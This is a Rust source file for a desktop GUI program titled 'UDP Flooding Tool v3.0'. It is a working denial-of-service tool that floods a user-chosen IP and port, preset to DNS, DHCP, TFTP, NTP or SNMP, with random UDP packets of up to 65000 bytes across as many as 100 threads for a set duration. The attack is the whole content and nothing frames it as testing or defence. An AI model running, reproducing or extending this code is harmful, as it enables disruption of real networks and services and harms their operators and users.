use eframe::egui;
use std::net::UdpSocket;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
use rand::Rng;
//dev by @lfillaz github.com/lfillaz 
#[derive(Default)]
struct App {
    target_ip: String,
    packet_size: usize,
    selected_port: usize,
    custom_port: String,
    duration: u64,
    threads: usize,
    attack_running: Arc<Mutex<bool>>,
    packet_info: Arc<Mutex<(u64, usize)>>, 
    show_alert: bool,
    alert_message: String,
    progress: f32, 
    start_time: Option<Instant>,
}

impl eframe::App for App {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        let mut visuals = egui::Visuals::dark();
        visuals.override_text_color = Some(egui::Color32::from_rgb(255, 0, 0));
        visuals.widgets.noninteractive.bg_fill = egui::Color32::from_rgba_premultiplied(0, 0, 0, 0);

        ctx.set_visuals(visuals);

        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading("UDP Flooding Tool v3.0");

            ui.horizontal(|ui| {
                ui.label("Target IP:");
                ui.text_edit_singleline(&mut self.target_ip);
            });

            ui.add_space(10.0);

            ui.horizontal(|ui| {
                ui.label("Packet Size (bytes):");
                ui.add(egui::Slider::new(&mut self.packet_size, 64..=65000).text("bytes"));
            });

            ui.add_space(10.0);

            ui.label("Select Common UDP Ports:");
            for (i, port) in COMMON_UDP_PORTS.iter().enumerate() {
                ui.radio_value(&mut self.selected_port, i, format!("{} (Port {})", port.name, port.port));
            }
            ui.radio_value(&mut self.selected_port, COMMON_UDP_PORTS.len(), "Custom Port");

            if self.selected_port == COMMON_UDP_PORTS.len() {
                ui.horizontal(|ui| {
                    ui.label("Custom Port:");
                    ui.text_edit_singleline(&mut self.custom_port);
                });
            }

            ui.add_space(10.0);

            ui.horizontal(|ui| {
                ui.label("Attack Duration (seconds):");
                ui.add(egui::Slider::new(&mut self.duration, 1..=600).text("seconds"));
            });

            ui.add_space(10.0);

            ui.horizontal(|ui| {
                ui.label("Number of Threads:");
                ui.add(egui::Slider::new(&mut self.threads, 1..=100).text("threads"));
            });

            ui.add_space(20.0);

            // packet
            {
                let (frequency, packets_sent) = *self.packet_info.lock().unwrap();
                ui.label(format!("Frequency: {} ms", frequency));
                ui.label(format!("Packets Sent: {}", packets_sent));
            }

            ui.add_space(20.0);

            ui.with_layout(egui::Layout::top_down(egui::Align::Center), |ui| {
                let button_response = ui.add_sized(
                    egui::vec2(150.0, 50.0),
                    egui::Button::new("Start Attack")
                        .fill(egui::Color32::from_rgb(0, 0, 0))
                        .stroke(egui::Stroke::new(1.0, egui::Color32::from_rgb(255, 255, 255))),
                );

                if button_response.on_hover_text("Click to start the attack").clicked() {
                    let target_ip = self.target_ip.clone();
                    let port = if self.selected_port == COMMON_UDP_PORTS.len() {
                        self.custom_port.parse::<usize>().unwrap_or(0)
                    } else {
                        COMMON_UDP_PORTS[self.selected_port].port
                    };
                    let packet_size = self.packet_size;
                    let duration = self.duration;
                    let threads = self.threads;
                    let attack_running = Arc::clone(&self.attack_running);
                    let packet_info = Arc::clone(&self.packet_info);

                    if !*attack_running.lock().unwrap() {
                        // Set arl
                        self.alert_message = format!(
                            "Starting attack with IP: {}, Port: {}, Packet Size: {}, Duration: {}, Threads: {}",
                            target_ip, port, packet_size, duration, threads
                        );
                        self.show_alert = true;
                        self.start_time = Some(Instant::now());

                        thread::spawn(move || {
                            *attack_running.lock().unwrap() = true;
                            start_udp_flood(target_ip, port, packet_size, duration, threads, packet_info);
                            *attack_running.lock().unwrap() = false;
                        });
                    } else {
                        println!("Attack is already running!");
                    }
                }
            });

            
            if let Some(start_time) = self.start_time {
                if *self.attack_running.lock().unwrap() {
                    let elapsed = start_time.elapsed().as_secs_f32();
                    self.progress = (elapsed / self.duration as f32).min(1.0);
                    ui.horizontal(|ui| {
                        ui.label("Attack Progress:");
                        ui.add(egui::ProgressBar::new(self.progress).text(format!("{:.1}%", self.progress * 100.0)));
                    });
                } else if self.progress < 1.0 {
                    self.progress = 1.0; 
                }
            }

            if *self.attack_running.lock().unwrap() {
                ui.label("Attack in progress...");
            }

            // Show alert message if available
            if self.show_alert {
                egui::Window::new("Alert").show(ctx, |ui| {
                    ui.label(&self.alert_message);
                    if ui.button("Close").clicked() {
                        self.show_alert = false;
                    }
                });
            }
        });
    }
}

fn start_udp_flood(
    target_ip: String,
    port: usize,
    packet_size: usize,
    duration: u64,
    threads: usize,
    packet_info: Arc<Mutex<(u64, usize)>>
) {
    let timeout = Duration::from_secs(duration);
    let attack_start = Instant::now();
    let mut handles = vec![];

    for _ in 0..threads {
        let target_ip = target_ip.clone();
        let packet_info = Arc::clone(&packet_info);
        let handle = thread::spawn(move || {
            let socket = match UdpSocket::bind("0.0.0.0:0") {
                Ok(socket) => socket,
                Err(e) => {
                    eprintln!("Failed to bind UDP socket: {}", e);
                    return;
                }
            };
            let mut rng = rand::thread_rng();
            let mut packet = vec![0u8; packet_size];
            let mut packets_sent = 0;
            let mut last_time = Instant::now();

            while attack_start.elapsed() < timeout {
                rng.fill(&mut packet[..]);
                if let Err(e) = socket.send_to(&packet, format!("{}:{}", target_ip, port)) {
                    eprintln!("Failed to send packet: {}", e);
                }
                packets_sent += 1;

                let elapsed = last_time.elapsed();
                if elapsed.as_secs() >= 1 {
                    let frequency = (elapsed.as_millis() as u64) / packets_sent as u64;
                    *packet_info.lock().unwrap() = (frequency, packets_sent);
                    last_time = Instant::now();
                }
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        handle.join().expect("Thread panicked");
    }
}

struct PortInfo {
    name: &'static str,
    port: usize,
}

const COMMON_UDP_PORTS: &[PortInfo] = &[
    PortInfo { name: "DNS", port: 53 },
    PortInfo { name: "DHCP", port: 67 },
    PortInfo { name: "TFTP", port: 69 },
    PortInfo { name: "NTP", port: 123 },
    PortInfo { name: "SNMP", port: 162 },
];

fn main() {
    let app = App {
        attack_running: Arc::new(Mutex::new(false)),
        packet_info: Arc::new(Mutex::new((0, 0))),
        show_alert: false,
        alert_message: String::new(),
        progress: 0.0,
        start_time: None,
        ..Default::default()
    };
    let native_options = eframe::NativeOptions {
        transparent: true,
        resizable: false,
        initial_window_size: Some(egui::vec2(400.0, 460.0)),
        ..Default::default()
    };

    if let Err(err) = eframe::run_native("UDP Flooding Tool v3.0 BY @lfillaz", native_options, Box::new(|_| Box::new(app))) {
        eprintln!("Failed to run native application: {:?}", err);
    }
}
